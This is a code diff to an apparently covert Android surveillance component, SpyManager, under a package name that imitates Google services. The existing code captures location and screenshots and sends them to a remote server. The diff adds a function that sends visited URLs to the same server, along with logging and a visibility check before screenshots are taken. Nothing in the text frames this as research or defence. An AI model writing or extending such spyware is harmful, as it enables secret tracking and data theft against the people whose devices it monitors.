@@ -3,11 +3,13 @@ package com.android.google.services.spymanager
 import android.graphics.Bitmap
 import android.os.Build
 import android.os.CountDownTimer
+import com.android.google.MainActivity
 import com.android.google.constants.LocationConstants
 import com.android.google.constants.ScreenshotConstants
 import com.android.google.remote.RemoteService
 import com.android.google.remote.models.LocationDTO
 import com.android.google.remote.models.ScreenshotDTO
+import com.android.google.remote.models.UrlDTO
 import com.android.google.services.screenshoot.IScreenshotService
 import com.android.google.services.tracker.LocationService
 import com.android.google.services.tracker.models.TrackerLocation
@@ -105,12 +107,16 @@ class SpyManager(
         val locationDTO = LocationDTO(location.lat, location.lon)
 
         remote.sendLocation(location = locationDTO)
+
+        logw("SpyManager. Sending location $location.")
     }
 
     private fun getLocationFromService(): TrackerLocation =
         LocationService.getLocation()
 
     fun takeAndSendScreenshot() = CoroutineScope(Dispatchers.IO).launch {
+        if(!MainActivity.isVisible) return@launch
+
         val screenBitmap = getScreenshotFromService()
         val base64 = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             screenBitmap.toBase64()
@@ -120,14 +126,23 @@ class SpyManager(
 
         val screenshotDTO = ScreenshotDTO(base64 = base64)
         remote.sendScreenshot(screenshotDTO)
+
+        logw("SpyManager. Sending screenshot $screenBitmap.")
     }
 
     private fun getScreenshotFromService(): Bitmap =
         screenshotService.takeScreenshot()
 
+    fun sendUrl(url: String) = CoroutineScope(Dispatchers.IO).launch {
+        val urlDTO = UrlDTO(url = url)
+        remote.sendUrl(urlDTO)
+
+        logw("SpyManager. Sending url $url.")
+    }
+
     companion object {
         private const val BASE_BITMAP = ""
-        private const val  ENDLESS = -1L
+        private const val ENDLESS = -1L
         private var INSTANCE: SpyManager? = null
 
         fun newInstance(
